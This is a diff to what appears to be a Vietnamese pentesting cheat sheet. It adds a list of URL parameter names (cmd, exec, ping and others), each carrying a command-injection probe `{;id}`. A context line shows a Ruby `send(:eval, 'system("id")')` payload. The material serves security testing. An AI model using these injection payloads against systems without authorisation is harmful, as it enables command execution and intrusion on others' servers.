@@ -19,7 +19,35 @@
 |             | `send()`                                     | `"send(:eval, 'system(\"id\")')"`                |        |
 
 ---
-
+Parameters where you can try Command Injection.
+```
+?cmd={;id}
+?exec={;id}
+?command={;id}
+?execute{;id}
+?ping={;id}
+?query={;id}
+?jump={;id}
+?code={;id}
+?reg={;id}
+?do={;id}
+?func={;id}
+?arg={;id}
+?option={;id}
+?load={;id}
+?process={;id}
+?step={;id}
+?read={;id}
+?function={;id}
+?req={;id}
+?feature={;id}
+?exe={;id}
+?module={;id}
+?;id={;id}
+?run={;id}
+?print={;id}
+```
+---
 ## 🚨 Gợi ý khai thác theo ngữ cảnh:
 
 * **Nếu URL có `/ping`, `/convert`, `/run`, `/template` →** test payload command injection.
